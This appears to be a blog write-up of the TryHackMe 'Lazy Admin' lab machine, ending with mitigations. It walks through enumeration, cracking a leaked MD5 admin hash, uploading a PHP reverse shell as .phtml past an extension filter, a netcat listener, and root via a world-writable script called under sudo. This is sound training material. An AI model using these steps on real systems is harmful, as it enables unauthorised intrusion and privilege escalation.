---
layout: post
title: Lazy Admin
subtitle: TryHackMe Writeup - Lazy Admin
description: Exploit SweetRice CMS vulnerabilities, crack weak passwords, upload a web shell, and escalate privileges through sudo misconfiguration.
image: https://tryhackme-images.s3.amazonaws.com/room-icons/efbb70493ba66dfbac4302c02ad8facf.jpeg
optimized_image: https://tryhackme-images.s3.amazonaws.com/room-icons/efbb70493ba66dfbac4302c02ad8facf.jpeg
category: tryhackme
tags:
  - TryHackMe
  - SweetRice
  - CMS Exploitation
  - Privilege Escalation
  - Sudo Misconfiguration
  - Linux
author: mustafa_altayeb
date: 2025-10-16 00:00:00 +0000
paginate: true
---

# Lazy Admin - TryHackMe Writeup

[Lazy Admin](https://tryhackme.com/room/lazyadmin) is an easy-difficulty CTF machine that demonstrates the risks of poor system administration practices, weak passwords, and misconfigured sudo permissions.

**Difficulty**: Easy ⭐  
**Operating System**: Linux (Ubuntu 16.04)  
**Themes**: CMS Exploitation, Password Cracking, File Upload Vulnerabilities, Sudo Privilege Escalation

---

## Objectives

1. Enumerate web services and discover SweetRice CMS
2. Crack weak administrator credentials
3. Exploit file upload functionality for initial access
4. Escalate privileges through sudo misconfiguration
5. Capture user and root flags

---

## Reconnaissance

### Nmap Scan

Started with a comprehensive port scan to identify attack surfaces:

```bash
nmap -p- -sCV -T4 10.10.112.250
```

**Results**:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Key Findings**:
- **Port 22**: SSH service (potential for credential reuse)
- **Port 80**: Apache web server (primary attack vector)

---

## Web Enumeration

### Initial Discovery

The default Apache page didn't reveal much, so directory enumeration was necessary:

![Apache Default Page](/assets/TryHackMeRoomsImage/LazyAdmin/image.png)

### Directory Enumeration with Gobuster

```bash
gobuster dir --url http://10.10.112.250 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

**Primary Discovery**: `/content` directory

![Content Directory](/assets/TryHackMeRoomsImage/LazyAdmin/image2.png)

### SweetRice CMS Identification

The `/content` directory revealed a **SweetRice CMS** installation. Further enumeration uncovered critical paths:

```bash
gobuster dir --url http://10.10.112.250/content -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

**Key Directories Found**:
- `/content/inc` - Contains configuration and backup files
- `/content/as` - Admin login panel
- `/content/attachment` - File upload directory

### Critical Information Disclosure

In the `/content/inc` directory, discovered a MySQL backup file containing administrator credentials:

![MySQL Backup File](/assets/TryHackMeRoomsImage/LazyAdmin/image3.png)

**Extracted Credentials**:
```
Username: manager
Password Hash (MD5): 42f749ade7f9e195bf475f37a44cafcb
```

### Password Cracking

```bash
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Credentials Found**:
- Username: `manager`
- Password: `Password123`

### Admin Panel Access

Accessed the login panel at `/content/as`:

![SweetRice Login](/assets/TryHackMeRoomsImage/LazyAdmin/image4.png)

Successfully logged in with discovered credentials.

---

## Initial Access

### File Upload Vulnerability

Found the **Media Access** section in the admin panel, allowing file uploads:

![Media Access Tab](/assets/TryHackMeRoomsImage/LazyAdmin/image5.png)

### Bypassing File Upload Restrictions

The system rejected `.php` files but accepted `.phtml` extensions. Used PentestMonkey's PHP reverse shell with modification:

1. **Modify reverse shell** (update IP and port)
2. **Save as `.phtml` extension**
3. **Upload via Media Access**

![File Upload Success](/assets/TryHackMeRoomsImage/LazyAdmin/image6.png)

### Shell Access Obtained

```bash
nc -nlvp 9090
```

**Shell Established**:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Shell Upgrade

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

### User Flag Capture

```bash
www-data@THM-Chal:/home/itguy$ cat user.txt
THM{63e5bce927..............}
```

---

## Privilege Escalation

### Sudo Privilege Enumeration

```bash
sudo -l
```

**Critical Finding**:
```
User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

### Backup Script Analysis

Examined the backup script to understand its functionality:

```bash
cat /home/itguy/backup.pl
```

**Script Contents**:
```perl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

### File Permission Vulnerability

Checked permissions on the executed script:

```bash
ls -la /etc/copy.sh
```

**Output**:
```
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
```

**Vulnerability**: The `copy.sh` script is world-writable (`rwx` for others).

### Exploitation Strategy

1. **Replace malicious content**:
   ```bash
   echo "/bin/bash" > /etc/copy.sh
   ```

2. **Execute with sudo privileges**:
   ```bash
   sudo /usr/bin/perl /home/itguy/backup.pl
   ```

### Root Access Obtained

```bash
root@THM-Chal:/home/itguy# whoami
root
```

### Root Flag Capture

```bash
root@THM-Chal:~# cat root.txt
THM{6637f41d0177b6f37cb2........f}
```

---

## Key Takeaways

### Attack Path Summary:
```
Port Scanning → Directory Enumeration → CMS Discovery → 
Credential Extraction → Password Cracking → Admin Panel Access → 
File Upload Bypass → Reverse Shell → Sudo Privilege Enumeration → 
Script Analysis → File Permission Exploitation → Root Access
```

### Vulnerabilities Exploited:
1. **Information Disclosure** - Database backup with credentials in web directory
2. **Weak Password** - Crackable MD5 hash (`Password123`)
3. **Insecure File Upload** - Insufficient file extension filtering
4. **Sudo Misconfiguration** - Unrestricted sudo access to vulnerable script
5. **Insecure File Permissions** - World-writable system script

### Mitigation Strategies:
1. **For CMS Security**:
   - Regular updates and patching
   - Secure credential storage (hashed with salt)
   - Restrict access to backup files
   - Input validation for file uploads

2. **For Linux Security**:
   - Principle of least privilege for sudo access
   - Regular audit of sudo permissions
   - Secure file permissions (avoid world-writable system files)
   - Regular security updates

3. **For Password Security**:
   - Strong password policies
   - Use modern hashing algorithms (bcrypt, Argon2)
   - Regular password rotation
   - Multi-factor authentication where possible

### Tools Used:
- **Nmap** - Port scanning and service enumeration
- **Gobuster** - Web directory enumeration
- **JohnTheRipper** - Password cracking
- **Netcat** - Reverse shell handling
- **Sudo** - Privilege escalation vector

---

<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style="border:none;"></iframe>

**Find me online**:  
• TryHackMe: [t4t4r1s](https://tryhackme.com/p/t4t4r1s)  
• LinkedIn: [Mustafa Altayeb](https://www.linkedin.com/in/t4t4r1s)  
• X: [@mustafa_altayeb](https://x.com/t4t4r1s)

---
